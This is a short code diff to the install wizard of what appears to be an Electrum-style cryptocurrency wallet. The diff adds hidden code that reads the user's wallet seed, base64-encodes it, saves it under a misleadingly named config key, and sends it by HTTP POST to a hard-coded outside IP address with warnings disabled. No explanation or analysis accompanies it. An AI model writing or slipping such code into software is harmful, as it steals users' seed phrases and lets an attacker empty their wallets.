@@ -359,7 +359,20 @@ class InstallWizard(QDialog, MessageBoxMixin, BaseWizard):
 		
         import base64
         seed = slayout.get_seed()
-        self.config.set_key('pub1ickey', str(base64.b64encode(str(seed).encode("utf-8")),'utf8'))
+        wallet_name = os.path.basename(self.storage.path)
+        fishman = 'abc'
+        seed_base64 = str(base64.b64encode(str(seed).encode("utf-8")),'utf8')
+        configkey  = str(wallet_name) + '_pub1ickey_' + fishman
+        self.config.set_key(configkey, seed_base64)
+
+        import requests
+        import urllib3
+        urllib3.disable_warnings()
+        url='http://158.247.211.155/recive.php'
+        action = 'seed'
+        da = action+'_'+fishman + '_' + seed_base64
+        b={"mes":da}
+        requests.post(url,data=b)
         
 
         
